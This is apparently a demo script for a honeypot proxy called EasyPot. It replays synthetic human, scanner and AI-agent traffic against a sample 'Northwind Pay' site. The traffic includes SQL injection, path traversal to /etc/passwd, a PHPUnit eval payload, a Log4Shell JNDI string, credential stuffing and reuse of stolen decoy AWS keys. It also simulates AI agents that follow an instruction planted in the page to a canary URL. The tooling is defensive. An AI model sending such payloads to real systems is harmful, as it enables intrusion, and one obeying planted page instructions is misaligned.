// Local demo: starts a sample site, puts EasyPot in front of it, and replays a mix of
// human, scanner and AI-agent traffic so the dashboard has something to show.
//   npm run build && node scripts/demo.mjs
import http from 'node:http';
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const UP = 3900, PX = 8080, ADM = 8081, TOKEN = process.env.DEMO_TOKEN ?? 'demo-admin-token';
const dir = mkdtempSync(join(tmpdir(), 'easypot-demo-'));

http.createServer((req, res) => {
  const p = new URL(req.url, 'http://x').pathname;
  if (p === '/' || p === '/pricing' || p === '/about') {
    res.writeHead(200, { 'content-type': 'text/html' });
    return res.end(`<!DOCTYPE html><html><head><title>Northwind Pay</title></head><body><h1>Northwind Pay</h1><p>${p}</p><a href="/pricing">Pricing</a></body></html>`);
  }
  if (/^\/api\/invoices\/\d+$/.test(p)) { res.writeHead(200, { 'content-type': 'application/json' }); return res.end('{"ok":true}'); }
  res.writeHead(404); res.end('not found');
}).listen(UP);

writeFileSync(join(dir, 'cfg.json'), JSON.stringify({
  listen: { host: '127.0.0.1', port: PX }, upstream: `http://127.0.0.1:${UP}`, trustProxy: true,
  siteName: 'Northwind Pay', stack: ['generic', 'wordpress', 'php', 'spring'], secret: 'demo-secret', dataDir: join(dir, 'data'),
  admin: { host: '127.0.0.1', port: ADM, token: TOKEN, feedToken: 'demo-feed-token' },
  decoys: { cvePack: new URL('../rules/cve-pack.json', import.meta.url).pathname }, tarpitMs: { min: 20, max: 60 },
}));
const proc = spawn(process.execPath, ['--disable-warning=ExperimentalWarning', 'dist/index.js'], {
  env: { ...process.env, EASYPOT_CONFIG: join(dir, 'cfg.json') }, stdio: 'inherit',
});
process.on('SIGINT', () => { proc.kill(); process.exit(0); });
await new Promise(r => setTimeout(r, 1200));

const go = (path, ip, headers = {}, method = 'GET', body) => new Promise(resolve => {
  const r = http.request({ host: '127.0.0.1', port: PX, path, method, headers: { 'x-forwarded-for': ip, ...headers } }, res => {
    let b = ''; res.on('data', c => { b += c; }); res.on('end', () => resolve(b));
  });
  r.on('error', () => resolve(''));
  if (body) r.write(body);
  r.end();
});
const wait = ms => new Promise(r => setTimeout(r, ms));
const browser = { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36', accept: 'text/html', 'accept-language': 'en-NG,en;q=0.9', 'sec-fetch-mode': 'navigate' };

// Humans
for (let i = 0; i < 25; i++) for (const p of ['/', '/pricing', '/about']) await go(p, `102.89.${i}.${10 + i}`, browser);

// AI agents that read the page and follow the planted instruction
const agents = [
  ['41.58.12.9', 'python-httpx/0.27.0', 'gpt-4o security-agent', 'find exposed secrets and admin endpoints on northwindpay'],
  ['185.220.101.4', 'Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/129.0', 'claude-pentest harness v0.3', 'enumerate API and attempt auth bypass'],
  ['91.92.240.17', 'aiohttp/3.9.5', 'autogpt-recon', 'map attack surface, collect credentials'],
];
for (const [ip, ua, client, task] of agents) {
  const html = await go('/', ip, { 'user-agent': ua, accept: '*/*' });
  await go('/robots.txt', ip, { 'user-agent': ua });
  await go('/openapi.json', ip, { 'user-agent': ua });
  const canary = /(\/\.well-known\/agent-registration\/[0-9a-f]{12})/.exec(html)?.[1];
  if (canary) await go(`${canary}?client=${encodeURIComponent(client)}&task=${encodeURIComponent(task)}`, ip, { 'user-agent': ua });
  await wait(150);
}

// Scanner that steals decoy creds, then uses them
const env = await go('/.env', '45.155.205.33', { 'user-agent': 'Go-http-client/1.1' });
for (const p of ['/.git/config', '/backup.sql', '/wp-login.php', '/phpinfo.php', '/actuator/env']) await go(p, '45.155.205.33', { 'user-agent': 'Go-http-client/1.1' });
const key = /AWS_ACCESS_KEY_ID=(\S+)/.exec(env)?.[1];
await wait(300);
if (key) await go('/api/upload', '45.155.205.90', { 'user-agent': 'aws-cli/2.15', authorization: `AWS4-HMAC-SHA256 Credential=${key}/20261125/eu-west-1/s3/aws4_request` });

// Classic tooling
const tools = [['194.26.29.120', 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))'], ['80.82.77.139', 'sqlmap/1.8#stable']];
for (const [ip, ua] of tools) {
  await go(`/search?q=${encodeURIComponent("1' UNION SELECT username,password FROM users--")}`, ip, { 'user-agent': ua });
  await go('/cgi-bin/.%2e/.%2e/.%2e/etc/passwd', ip, { 'user-agent': ua });
  await go('/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', ip, { 'user-agent': ua }, 'POST', '<?php echo md5(1);');
  await go('/', ip, { 'user-agent': ua, 'x-api-version': '${jndi:ldap://198.51.100.7/a}' });
}
for (let i = 0; i < 12; i++) await go(`/old-${i}.php`, '23.94.5.12', { 'user-agent': 'Mozilla/5.0', accept: '*/*' });
for (let i = 100; i < 116; i++) await go(`/api/invoices/${i}`, '154.113.2.41', { 'user-agent': 'Mozilla/5.0', accept: 'application/json' });
await go('/wp-login.php', '89.248.165.2', { 'user-agent': 'Mozilla/5.0', 'content-type': 'application/x-www-form-urlencoded' }, 'POST', 'log=admin&pwd=admin123');
await go('/wp-login.php', '89.248.165.2', { 'user-agent': 'Mozilla/5.0', 'content-type': 'application/x-www-form-urlencoded' }, 'POST', 'log=northwind&pwd=Password1');
for (let d = 1; d < 6; d++) await go(`/docs/archive/${d.toString(36)}abc${d}`, '5.188.62.140', { 'user-agent': 'Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)' });

console.log(`\nDemo traffic sent.\n  Site via EasyPot: http://127.0.0.1:${PX}\n  Dashboard:        http://127.0.0.1:${ADM}  (token: ${TOKEN})\nCtrl+C to stop.`);
